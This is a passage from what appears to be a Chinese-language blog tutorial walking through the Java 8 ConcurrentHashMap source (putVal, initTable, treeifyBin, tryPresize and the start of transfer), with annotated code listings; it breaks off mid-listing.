class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> V <span class="title function_">putVal</span><span class="params">(K key, V value, <span class="type">boolean</span> onlyIfAbsent)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">null</span> || value == <span class="literal">null</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    <span class="comment">// 得到 hash 值</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> spread(key.hashCode());</span><br><span class="line">    <span class="comment">// 用于记录相应链表的长度</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">binCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (Node&lt;K,V&gt;[] tab = table;;) &#123;</span><br><span class="line">        Node&lt;K,V&gt; f; <span class="type">int</span> n, i, fh;</span><br><span class="line">        <span class="comment">// 如果数组&quot;空&quot;，进行数组初始化</span></span><br><span class="line">        <span class="keyword">if</span> (tab == <span class="literal">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">            <span class="comment">// 初始化数组，后面会详细介绍</span></span><br><span class="line">            tab = initTable();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 找该 hash 值对应的数组下标，得到第一个节点 f</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((f = tabAt(tab, i = (n - <span class="number">1</span>) &amp; hash)) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果数组该位置为空，</span></span><br><span class="line">            <span class="comment">//    用一次 CAS 操作将这个新值放入其中即可，这个 put 操作差不多就结束了，可以拉到最后面了</span></span><br><span class="line">            <span class="comment">//  如果 CAS 失败，那就是有并发操作，进到下一个循环就好了</span></span><br><span class="line">            <span class="keyword">if</span> (casTabAt(tab, i, <span class="literal">null</span>,</span><br><span class="line">                         <span class="keyword">new</span> <span class="title class_">Node</span>&lt;K,V&gt;(hash, key, value, <span class="literal">null</span>)))</span><br><span class="line">                <span class="keyword">break</span>;                   <span class="comment">// no lock when adding to empty bin</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// hash 居然可以等于 MOVED，这个需要到后面才能看明白，不过从名字上也能猜到，肯定是因为在扩容</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((fh = f.hash) == MOVED)</span><br><span class="line">            <span class="comment">// 帮助数据迁移，这个等到看完数据迁移部分的介绍后，再理解这个就很简单了</span></span><br><span class="line">            tab = helpTransfer(tab, f);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// 到这里就是说，f 是该位置的头结点，而且不为空</span></span><br><span class="line">            </span><br><span class="line">            <span class="type">V</span> <span class="variable">oldVal</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="comment">// 获取数组该位置的头结点的监视器锁</span></span><br><span class="line">            <span class="keyword">synchronized</span> (f) &#123;</span><br><span class="line">                <span class="keyword">if</span> (tabAt(tab, i) == f) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (fh &gt;= <span class="number">0</span>) &#123; <span class="comment">// 头结点的 hash 值大于 0，说明是链表</span></span><br><span class="line">                        <span class="comment">// 用于累加，记录链表的长度</span></span><br><span class="line">                        binCount = <span class="number">1</span>;</span><br><span class="line">                        <span class="comment">// 遍历链表</span></span><br><span class="line">                        <span class="keyword">for</span> (Node&lt;K,V&gt; e = f;; ++binCount) &#123;</span><br><span class="line">                            K ek;</span><br><span class="line">                            <span class="comment">// 如果发现了&quot;相等&quot;的 key，判断是否要进行值覆盖，然后也就可以 break 了</span></span><br><span class="line">                            <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                                ((ek = e.key) == key ||</span><br><span class="line">                                 (ek != <span class="literal">null</span> &amp;&amp; key.equals(ek)))) &#123;</span><br><span class="line">                                oldVal = e.val;</span><br><span class="line">                                <span class="keyword">if</span> (!onlyIfAbsent)</span><br><span class="line">                                    e.val = value;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="comment">// 到了链表的最末端，将这个新值放到链表的最后面</span></span><br><span class="line">                            Node&lt;K,V&gt; pred = e;</span><br><span class="line">                            <span class="keyword">if</span> ((e = e.next) == <span class="literal">null</span>) &#123;</span><br><span class="line">                                pred.next = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;K,V&gt;(hash, key,</span><br><span class="line">                                                          value, <span class="literal">null</span>);</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (f <span class="keyword">instanceof</span> TreeBin) &#123; <span class="comment">// 红黑树</span></span><br><span class="line">                        Node&lt;K,V&gt; p;</span><br><span class="line">                        binCount = <span class="number">2</span>;</span><br><span class="line">                        <span class="comment">// 调用红黑树的插值方法插入新节点</span></span><br><span class="line">                        <span class="keyword">if</span> ((p = ((TreeBin&lt;K,V&gt;)f).putTreeVal(hash, key,</span><br><span class="line">                                                       value)) != <span class="literal">null</span>) &#123;</span><br><span class="line">                            oldVal = p.val;</span><br><span class="line">                            <span class="keyword">if</span> (!onlyIfAbsent)</span><br><span class="line">                                p.val = value;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (binCount != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// 判断是否要将链表转换为红黑树，临界值和 HashMap 一样，也是 8</span></span><br><span class="line">                <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD)</span><br><span class="line">                    <span class="comment">// 这个方法和 HashMap 中稍微有一点点不同，那就是它不是一定会进行红黑树转换，</span></span><br><span class="line">                    <span class="comment">// 如果当前数组的长度小于 64，那么会选择进行数组扩容，而不是转换为红黑树</span></span><br><span class="line">                    <span class="comment">//    具体源码我们就不看了，扩容部分后面说</span></span><br><span class="line">                    treeifyBin(tab, i);</span><br><span class="line">                <span class="keyword">if</span> (oldVal != <span class="literal">null</span>)</span><br><span class="line">                    <span class="keyword">return</span> oldVal;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    addCount(<span class="number">1L</span>, binCount);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>put 的主流程看完了，但是至少留下了几个问题，第一个是初始化，第二个是扩容，第三个是帮助数据迁移，这些我们都会在后面进行一一介绍。</p><h4><span id="初始化数组inittable">初始化数组：initTable</span></h4><p>这个比较简单，主要就是初始化一个<strong>合适大小</strong>的数组，然后会设置 sizeCtl。</p><p>初始化方法中的并发问题是通过对 sizeCtl 进行一个 CAS 操作来控制的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Node&lt;K,V&gt;[] initTable() &#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; <span class="type">int</span> sc;</span><br><span class="line">    <span class="keyword">while</span> ((tab = table) == <span class="literal">null</span> || tab.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 初始化的&quot;功劳&quot;被其他线程&quot;抢去&quot;了</span></span><br><span class="line">        <span class="keyword">if</span> ((sc = sizeCtl) &lt; <span class="number">0</span>)</span><br><span class="line">            Thread.<span class="keyword">yield</span>(); <span class="comment">// lost initialization race; just spin</span></span><br><span class="line">        <span class="comment">// CAS 一下，将 sizeCtl 设置为 -1，代表抢到了锁</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (U.compareAndSwapInt(<span class="built_in">this</span>, SIZECTL, sc, -<span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> ((tab = table) == <span class="literal">null</span> || tab.length == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">// DEFAULT_CAPACITY 默认初始容量是 16</span></span><br><span class="line">                    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> (sc &gt; <span class="number">0</span>) ? sc : DEFAULT_CAPACITY;</span><br><span class="line"><span class="comment">// 初始化数组，长度为 16 或初始化时提供的长度</span></span><br><span class="line">                    Node&lt;K,V&gt;[] nt = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>&lt;?,?&gt;[n];</span><br><span class="line">                    <span class="comment">// 将这个数组赋值给 table，table 是 volatile 的</span></span><br><span class="line">                    table = tab = nt;</span><br><span class="line">                    <span class="comment">// 如果 n 为 16 的话，那么这里 sc = 12</span></span><br><span class="line">                    <span class="comment">// 其实就是 0.75 * n</span></span><br><span class="line">                    sc = n - (n &gt;&gt;&gt; <span class="number">2</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="comment">// 设置 sizeCtl 为 sc，我们就当是 12 吧</span></span><br><span class="line">                sizeCtl = sc;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tab;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4><span id="链表转红黑树-treeifybin">链表转红黑树: treeifyBin</span></h4><p>前面我们在 put 源码分析也说过，treeifyBin 不一定就会进行红黑树转换，也可能是仅仅做数组扩容。我们还是进行源码分析吧。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">treeifyBin</span><span class="params">(Node&lt;K,V&gt;[] tab, <span class="type">int</span> index)</span> &#123;</span><br><span class="line">    Node&lt;K,V&gt; b; <span class="type">int</span> n, sc;</span><br><span class="line">    <span class="keyword">if</span> (tab != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// MIN_TREEIFY_CAPACITY 为 64</span></span><br><span class="line">        <span class="comment">// 所以，如果数组长度小于 64 的时候，其实也就是 32 或者 16 或者更小的时候，会进行数组扩容</span></span><br><span class="line">        <span class="keyword">if</span> ((n = tab.length) &lt; MIN_TREEIFY_CAPACITY)</span><br><span class="line">            <span class="comment">// 后面我们再详细分析这个方法</span></span><br><span class="line">            tryPresize(n &lt;&lt; <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// b 是头结点</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((b = tabAt(tab, index)) != <span class="literal">null</span> &amp;&amp; b.hash &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 加锁</span></span><br><span class="line">            <span class="keyword">synchronized</span> (b) &#123;</span><br><span class="line">            </span><br><span class="line">                <span class="keyword">if</span> (tabAt(tab, index) == b) &#123;</span><br><span class="line">                    <span class="comment">// 下面就是遍历链表，建立一颗红黑树</span></span><br><span class="line">                    TreeNode&lt;K,V&gt; hd = <span class="literal">null</span>, tl = <span class="literal">null</span>;</span><br><span class="line">                    <span class="keyword">for</span> (Node&lt;K,V&gt; e = b; e != <span class="literal">null</span>; e = e.next) &#123;</span><br><span class="line">                        TreeNode&lt;K,V&gt; p =</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">TreeNode</span>&lt;K,V&gt;(e.hash, e.key, e.val,</span><br><span class="line">                                              <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">                        <span class="keyword">if</span> ((p.prev = tl) == <span class="literal">null</span>)</span><br><span class="line">                            hd = p;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                            tl.next = p;</span><br><span class="line">                        tl = p;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 将红黑树设置到数组相应位置中</span></span><br><span class="line">                    setTabAt(tab, index, <span class="keyword">new</span> <span class="title class_">TreeBin</span>&lt;K,V&gt;(hd));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="扩容trypresize">扩容：tryPresize</span></h3><p>如果说 Java8 ConcurrentHashMap 的源码不简单，那么说的就是扩容操作和迁移操作。</p><p>这个方法要完完全全看懂还需要看之后的 transfer 方法，读者应该提前知道这点。</p><p>这里的扩容也是做翻倍扩容的，扩容后数组容量为原来的 2 倍。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 首先要说明的是，方法参数 size 传进来的时候就已经翻了倍了</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">tryPresize</span><span class="params">(<span class="type">int</span> size)</span> &#123;</span><br><span class="line">    <span class="comment">// c：size 的 1.5 倍，再加 1，再往上取最近的 2 的 n 次方。</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> (size &gt;= (MAXIMUM_CAPACITY &gt;&gt;&gt; <span class="number">1</span>)) ? MAXIMUM_CAPACITY :</span><br><span class="line">        tableSizeFor(size + (size &gt;&gt;&gt; <span class="number">1</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="type">int</span> sc;</span><br><span class="line">    <span class="keyword">while</span> ((sc = sizeCtl) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        Node&lt;K,V&gt;[] tab = table; <span class="type">int</span> n;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 这个 if 分支和之前说的初始化数组的代码基本上是一样的，在这里，我们可以不用管这块代码</span></span><br><span class="line">        <span class="keyword">if</span> (tab == <span class="literal">null</span> || (n = tab.length) == <span class="number">0</span>) &#123;</span><br><span class="line">            n = (sc &gt; c) ? sc : c;</span><br><span class="line">            <span class="keyword">if</span> (U.compareAndSwapInt(<span class="built_in">this</span>, SIZECTL, sc, -<span class="number">1</span>)) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (table == tab) &#123;</span><br><span class="line">                        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                        Node&lt;K,V&gt;[] nt = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>&lt;?,?&gt;[n];</span><br><span class="line">                        table = nt;</span><br><span class="line">                        sc = n - (n &gt;&gt;&gt; <span class="number">2</span>); <span class="comment">// 0.75 * n</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    sizeCtl = sc;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (c &lt;= sc || n &gt;= MAXIMUM_CAPACITY)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (tab == table) &#123;</span><br><span class="line">            <span class="comment">// 我没看懂 rs 的真正含义是什么，不过也关系不大</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">rs</span> <span class="operator">=</span> resizeStamp(n);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (sc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                Node&lt;K,V&gt;[] nt;</span><br><span class="line">                <span class="keyword">if</span> ((sc &gt;&gt;&gt; RESIZE_STAMP_SHIFT) != rs || sc == rs + <span class="number">1</span> ||</span><br><span class="line">                    sc == rs + MAX_RESIZERS || (nt = nextTable) == <span class="literal">null</span> ||</span><br><span class="line">                    transferIndex &lt;= <span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">// 2. 用 CAS 将 sizeCtl 加 1，然后执行 transfer 方法</span></span><br><span class="line">                <span class="comment">//    此时 nextTab 不为 null</span></span><br><span class="line">                <span class="keyword">if</span> (U.compareAndSwapInt(<span class="built_in">this</span>, SIZECTL, sc, sc + <span class="number">1</span>))</span><br><span class="line">                    transfer(tab, nt);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 1. 将 sizeCtl 设置为 (rs &lt;&lt; RESIZE_STAMP_SHIFT) + 2)</span></span><br><span class="line">            <span class="comment">//     我是没看懂这个值真正的意义是什么？不过可以计算出来的是，结果是一个比较大的负数</span></span><br><span class="line">            <span class="comment">//  调用 transfer 方法，此时 nextTab 参数为 null</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (U.compareAndSwapInt(<span class="built_in">this</span>, SIZECTL, sc,</span><br><span class="line">                                         (rs &lt;&lt; RESIZE_STAMP_SHIFT) + <span class="number">2</span>))</span><br><span class="line">                transfer(tab, <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法的核心在于 sizeCtl 值的操作，首先将其设置为一个负数，然后执行 transfer(tab, null)，再下一个循环将 sizeCtl 加 1，并执行 transfer(tab, nt)，之后可能是继续 sizeCtl 加 1，并执行 transfer(tab, nt)。</p><p>所以，可能的操作就是执行 **1 次 transfer(tab, null) + 多次 transfer(tab, nt)**，这里怎么结束循环的需要看完 transfer 源码才清楚。</p><h4><span id="数据迁移transfer">数据迁移：transfer</span></h4><p>下面这个方法有点长，将原来的 tab 数组的元素迁移到新的 nextTab 数组中。</p><p>虽然我们之前说的 tryPresize 方法中多次调用 transfer 不涉及多线程，但是这个 transfer 方法可以在其他地方被调用，典型地，我们之前在说 put 方法的时候就说过了，请往上看 put 方法，是不是有个地方调用了 helpTransfer 方法，helpTransfer 方法会调用 transfer 方法的。</p><p>此方法支持多线程执行，外围调用此方法的时候，会保证第一个发起数据迁移的线程，nextTab 参数为 null，之后再调用此方法的时候，nextTab 不会为 null。</p><p>阅读源码之前，先要理解并发操作的机制。原数组长度为 n，所以我们有 n 个迁移任务，让每个线程每次负责一个小任务是最简单的，每做完一个任务再检测是否有其他没做完的任务，帮助迁移就可以了，而 Doug Lea 使用了一个 stride，简单理解就是<strong>步长</strong>，每个线程每次负责迁移其中的一部分，如每次迁移 16 个小任务。所以，我们就需要一个全局的调度者来安排哪个线程执行哪几个任务，这个就是属性 transferIndex 的作用。</p><p>第一个发起数据迁移的线程会将 transferIndex 指向原数组最后的位置，然后<strong>从后往前</strong>的 stride 个任务属于第一个线程，然后将 transferIndex 指向新的位置，再往前的 stride 个任务属于第二个线程，依此类推。当然，这里说的第二个线程不是真的一定指代了第二个线程，也可以是同一个线程，这个读者应该能理解吧。其实就是将一个大的迁移任务分为了一个个任务包。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">transfer</span><span class="params">(Node&lt;K,V&gt;[] tab, Node&lt;K,V&gt;[] nextTab)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> tab.length, stride;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// stride 在单核下直接等于 n，多核模式下为 (n&gt;&gt;&gt;3)/NCPU，最小值是 16</span></span><br><span class="line">    <span class="comment">// stride 可以理解为”步长“，有 n 个位置是需要进行迁移的，</span></span><br><span class="line">    <span class="comment">//   将这 n 个任务分为多个任务包，每个任务包有 stride 个任务</span></span><br><span class="line">    <span class="keyword">if</span> ((stride = (NCPU &gt; <span class="number">1</span>) ? (n &gt;&gt;&gt; <span class="number">3</span>) / NCPU : n) &lt; MIN_TRANSFER_STRIDE)</span><br><span class="line">        stride = MIN_TRANSFER_STRIDE; <span class="comment">// subdivide range</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果 nextTab 为 null，先进行一次初始化</span></span><br><span class="line">    <span class="comment">//    前面我们说了，外围会保证第一个发起迁移的线程调用此方法时，参数 nextTab 为 null</span></span><br><span class="line">    <span class="comment">//   之后参与迁移的线程调用此方法时，nextTab 不会为 null</span></span><br><span class="line">    <span class="keyword">if</span> (nextTab == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 容量翻倍</span></span><br><span class="line">            Node&lt;K,V&gt;[] nt = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>&lt;?,?&gt;[n &lt;&lt; <span class="number">1</span>];</span><br><span class="line">            nextTab = nt;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable ex) &#123;      <span class="comment">// try to cope with OOME</span></span><br><span class="line">            sizeCtl = Integer.MAX_VALUE;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// nextTable 是 ConcurrentHashMap 中的属性</span></span><br><span class="line">        nextTable = nextTab;</span><br><span class="line">        <span class="comment">// transferIndex 也是 ConcurrentHashMap 